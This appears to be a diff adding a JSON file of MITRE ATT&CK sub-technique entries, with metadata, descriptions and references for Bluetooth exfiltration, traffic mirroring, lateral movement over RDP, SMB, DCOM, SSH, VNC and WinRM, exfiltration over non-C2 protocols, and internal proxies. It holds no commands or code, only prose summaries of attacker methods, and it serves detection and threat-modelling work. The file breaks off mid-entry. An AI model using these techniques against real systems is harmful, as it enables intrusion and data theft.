@@ -1,0 +1,1452 @@
+[
+  {
+    "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
+    "platform": "linux|macos|windows",
+    "tid": "T1011.001",
+    "technique": "Exfiltration Over Bluetooth",
+    "tactic": "exfiltration",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
+    "technique_references": [],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
+    "platform": "network|iaas",
+    "tid": "T1020.001",
+    "technique": "Traffic Duplication",
+    "tactic": "exfiltration",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
+    "technique_references": [
+      {
+        "source_name": "AWS Traffic Mirroring",
+        "url": "https://docs.aws.amazon.com/vpc/latest/mirroring/traffic-mirroring-how-it-works.html",
+        "description": "Amazon Web Services. (n.d.). How Traffic Mirroring works. Retrieved March 17, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco Traffic Mirroring",
+        "url": "https://www.cisco.com/c/en/us/td/docs/routers/crs/software/crs_r5-1/interfaces/configuration/guide/hc51xcrsbook/hc51span.html",
+        "description": "Cisco. (n.d.). Cisco IOS XR Interface and Hardware Component Configuration Guide for the Cisco CRS Router, Release 5.1.x. Retrieved October 19, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "GCP Packet Mirroring",
+        "url": "https://cloud.google.com/vpc/docs/packet-mirroring",
+        "description": "Google Cloud. (n.d.). Packet Mirroring overview. Retrieved March 17, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Juniper Traffic Mirroring",
+        "url": "https://www.juniper.net/documentation/en_US/junos/topics/concept/port-mirroring-ex-series.html",
+        "description": "Juniper. (n.d.). Understanding Port Mirroring on EX2200, EX3200, EX3300, EX4200, EX4500, EX4550, EX6200, and EX8200 Series Switches. Retrieved October 19, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Azure Virtual Network TAP",
+        "url": "https://docs.microsoft.com/en-us/azure/virtual-network/virtual-network-tap-overview",
+        "description": "Microsoft. (2022, February 9). Virtual network TAP. Retrieved March 17, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco Blog Legacy Device Attacks",
+        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
+        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "US-CERT-TA18-106A",
+        "url": "https://www.us-cert.gov/ncas/alerts/TA18-106A",
+        "description": "US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf",
+    "platform": "windows",
+    "tid": "T1021.001",
+    "technique": "Remote Desktop Protocol",
+    "tactic": "lateral-movement",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware)",
+    "technique_references": [
+      {
+        "source_name": "TechNet Remote Desktop Services",
+        "url": "https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx",
+        "description": "Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Alperovitch Malware",
+        "url": "http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/",
+        "description": "Alperovitch, D. (2014, October 31). Malware-Free Intrusions. Retrieved November 4, 2014.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "remotedesktopusers|user",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541",
+    "platform": "windows",
+    "tid": "T1021.002",
+    "technique": "SMB/Windows Admin Shares",
+    "tactic": "lateral-movement",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",
+    "technique_references": [
+      {
+        "source_name": "Medium Detecting WMI Persistence",
+        "url": "https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96",
+        "description": "French, D. (2018, October 9). Detecting & Removing an Attacker’s WMI Persistence. Retrieved October 11, 2019.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "TechNet RPC",
+        "url": "https://technet.microsoft.com/en-us/library/cc787851.aspx",
+        "description": "Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12, 2016.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft Admin Shares",
+        "url": "http://support.microsoft.com/kb/314984",
+        "description": "Microsoft. (n.d.). How to create and delete hidden or administrative shares on client computers. Retrieved November 20, 2014.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Windows Event Forwarding Payne",
+        "url": "https://docs.microsoft.com/en-us/archive/blogs/jepayne/monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem",
+        "description": "Payne, J. (2015, November 23). Monitoring what matters - Windows Event Forwarding for everyone (even if you already have a SIEM.). Retrieved February 1, 2016.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Lateral Movement Payne",
+        "url": "https://docs.microsoft.com/en-us/archive/blogs/jepayne/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts",
+        "description": "Payne, J. (2015, November 26). Tracking Lateral Movement Part One - Special Groups and Specific Service Accounts. Retrieved February 1, 2016.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Wikipedia Server Message Block",
+        "url": "https://en.wikipedia.org/wiki/Server_Message_Block",
+        "description": "Wikipedia. (2017, December 16). Server Message Block. Retrieved December 21, 2017.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--68a0c5ed-bee2-4513-830d-5b0d650139bd",
+    "platform": "windows",
+    "tid": "T1021.003",
+    "technique": "Distributed Component Object Model",
+    "tactic": "lateral-movement",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)",
+    "technique_references": [
+      {
+        "source_name": "Fireeye Hunting COM June 2019",
+        "url": "https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html",
+        "description": "Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft COM",
+        "url": "https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx",
+        "description": "Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft COM ACL",
+        "url": "https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1",
+        "description": "Microsoft. (n.d.). DCOM Security Enhancements in Windows XP Service Pack 2 and Windows Server 2003 Service Pack 1. Retrieved November 22, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft Process Wide Com Keys",
+        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx",
+        "description": "Microsoft. (n.d.). Setting Process-Wide Security Through the Registry. Retrieved November 21, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "MSDN WMI",
+        "url": "https://msdn.microsoft.com/en-us/library/aa394582.aspx",
+        "description": "Microsoft. (n.d.). Windows Management Instrumentation. Retrieved April 27, 2016.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Enigma DCOM Lateral Movement Jan 2017",
+        "url": "https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/",
+        "description": "Nelson, M. (2017, January 23). Lateral Movement via DCOM: Round 2. Retrieved November 21, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Enigma MMC20 COM Jan 2017",
+        "url": "https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/",
+        "description": "Nelson, M. (2017, January 5). Lateral Movement using the MMC20 Application COM Object. Retrieved November 21, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Enigma Outlook DCOM Lateral Movement Nov 2017",
+        "url": "https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/",
+        "description": "Nelson, M. (2017, November 16). Lateral Movement using Outlook's CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Enigma Excel DCOM Sept 2017",
+        "url": "https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/",
+        "description": "Nelson, M. (2017, September 11). Lateral Movement using Excel.Application and DCOM. Retrieved November 21, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cyberreason DCOM DDE Lateral Movement Nov 2017",
+        "url": "https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom",
+        "description": "Tsukerman, P. (2017, November 8). Leveraging Excel DDE for lateral movement via DCOM. Retrieved November 21, 2017.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6",
+    "platform": "linux|macos",
+    "tid": "T1021.004",
+    "technique": "SSH",
+    "tactic": "lateral-movement",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",
+    "technique_references": [
+      {
+        "source_name": "Apple Unified Log Analysis Remote Login and Screen Sharing",
+        "url": "https://sarah-edwards-xzkc.squarespace.com/blog/2020/4/30/analysis-of-apple-unified-logs-quarantine-edition-entry-6-working-from-home-remote-logins",
+        "description": "Sarah Edwards. (2020, April 30). Analysis of Apple Unified Logs: Quarantine Edition [Entry 6] – Working From Home? Remote Logins. Retrieved August 19, 2021.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b",
+    "platform": "linux|macos|windows",
+    "tid": "T1021.005",
+    "technique": "VNC",
+    "tactic": "lateral-movement",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)",
+    "technique_references": [
+      {
+        "source_name": "The Remote Framebuffer Protocol",
+        "url": "https://datatracker.ietf.org/doc/html/rfc6143#section-7.2.2",
+        "description": "T. Richardson, J. Levine, RealVNC Ltd.. (2011, March). The Remote Framebuffer Protocol. Retrieved September 20, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "MacOS VNC software for Remote Desktop",
+        "url": "https://support.apple.com/guide/remote-desktop/set-up-a-computer-running-vnc-software-apdbed09830/mac",
+        "description": "Apple Support. (n.d.). Set up a computer running VNC software for Remote Desktop. Retrieved August 18, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "VNC Authentication",
+        "url": "https://help.realvnc.com/hc/en-us/articles/360002250097-Setting-up-System-Authentication",
+        "description": "Tegan. (2019, August 15). Setting up System Authentication. Retrieved September 20, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Hijacking VNC",
+        "url": "https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc",
+        "description": "Z3RO. (2019, March 10). Day 70: Hijacking VNC (Enum, Brute, Access and Crack). Retrieved September 20, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "macOS root VNC login without authentication",
+        "url": "https://www.tenable.com/blog/detecting-macos-high-sierra-root-account-without-authentication",
+        "description": "Nick Miles. (2017, November 30). Detecting macOS High Sierra root account without authentication. Retrieved September 20, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "VNC Vulnerabilities",
+        "url": "https://www.bleepingcomputer.com/news/security/dozens-of-vnc-vulnerabilities-found-in-linux-windows-solutions/",
+        "description": "Sergiu Gatlan. (2019, November 22). Dozens of VNC Vulnerabilities Found in Linux, Windows Solutions. Retrieved September 20, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Offensive Security VNC Authentication Check",
+        "url": "https://www.offensive-security.com/metasploit-unleashed/vnc-authentication/",
+        "description": "Offensive Security. (n.d.). VNC Authentication. Retrieved October 6, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Attacking VNC Servers PentestLab",
+        "url": "https://pentestlab.blog/2012/10/30/attacking-vnc-servers/",
+        "description": "Administrator, Penetration Testing Lab. (2012, October 30). Attacking VNC Servers. Retrieved October 6, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Havana authentication bug",
+        "url": "http://lists.openstack.org/pipermail/openstack/2013-December/004138.html",
+        "description": "Jay Pipes. (2013, December 23). Security Breach! Tenant A is seeing the VNC Consoles of Tenant B!. Retrieved October 6, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Apple Unified Log Analysis Remote Login and Screen Sharing",
+        "url": "https://sarah-edwards-xzkc.squarespace.com/blog/2020/4/30/analysis-of-apple-unified-logs-quarantine-edition-entry-6-working-from-home-remote-logins",
+        "description": "Sarah Edwards. (2020, April 30). Analysis of Apple Unified Logs: Quarantine Edition [Entry 6] – Working From Home? Remote Logins. Retrieved August 19, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Gnome Remote Desktop grd-settings",
+        "url": "https://gitlab.gnome.org/GNOME/gnome-remote-desktop/-/blob/9aa9181e/src/grd-settings.c#L207",
+        "description": "Pascal Nowack. (n.d.). Retrieved September 21, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Gnome Remote Desktop gschema",
+        "url": "https://gitlab.gnome.org/GNOME/gnome-remote-desktop/-/blob/9aa9181e/src/org.gnome.desktop.remote-desktop.gschema.xml.in",
+        "description": "Pascal Nowack. (n.d.). Retrieved September 21, 2021.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--60d0c01d-e2bf-49dd-a453-f8a9c9fa6f65",
+    "platform": "windows",
+    "tid": "T1021.006",
+    "technique": "Windows Remote Management",
+    "tactic": "lateral-movement",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)",
+    "technique_references": [
+      {
+        "source_name": "Microsoft WinRM",
+        "url": "http://msdn.microsoft.com/en-us/library/aa384426",
+        "description": "Microsoft. (n.d.). Windows Remote Management. Retrieved November 12, 2014.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Jacobsen 2014",
+        "url": "https://www.slideshare.net/kieranjacobsen/lateral-movement-with-power-shell-2",
+        "description": "Jacobsen, K. (2014, May 16). Lateral Movement with PowerShell&#91;slides&#93;. Retrieved November 12, 2014.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "MSDN WMI",
+        "url": "https://msdn.microsoft.com/en-us/library/aa394582.aspx",
+        "description": "Microsoft. (n.d.). Windows Management Instrumentation. Retrieved April 27, 2016.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Medium Detecting Lateral Movement",
+        "url": "https://medium.com/threatpunter/detecting-lateral-movement-using-sysmon-and-splunk-318d3be141bc",
+        "description": "French, D. (2018, September 30). Detecting Lateral Movement Using Sysmon and Splunk. Retrieved October 11, 2019.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user|administrator",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--79a4052e-1a89-4b09-aea6-51f1d11fe19c",
+    "platform": "linux|macos|windows",
+    "tid": "T1048.001",
+    "technique": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
+    "tactic": "exfiltration",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). ",
+    "technique_references": [
+      {
+        "source_name": "University of Birmingham C2",
+        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
+        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--8e350c1d-ac79-4b5c-bd4e-7476d7e84ec5",
+    "platform": "linux|macos|windows",
+    "tid": "T1048.002",
+    "technique": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
+    "tactic": "exfiltration",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. ",
+    "technique_references": [
+      {
+        "source_name": "University of Birmingham C2",
+        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
+        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b",
+    "platform": "linux|macos|windows|network",
+    "tid": "T1048.003",
+    "technique": "Exfiltration Over Unencrypted Non-C2 Protocol",
+    "tactic": "exfiltration",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",
+    "technique_references": [
+      {
+        "source_name": "copy_cmd_cisco",
+        "url": "https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/C_commands.html#wp1068167689",
+        "description": "Cisco. (2022, August 16). copy - Cisco IOS Configuration Fundamentals Command Reference . Retrieved July 13, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "University of Birmingham C2",
+        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
+        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755",
+    "platform": "linux|macos|windows",
+    "tid": "T1090.001",
+    "technique": "Internal Proxy",
+    "tactic": "command-and-control",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
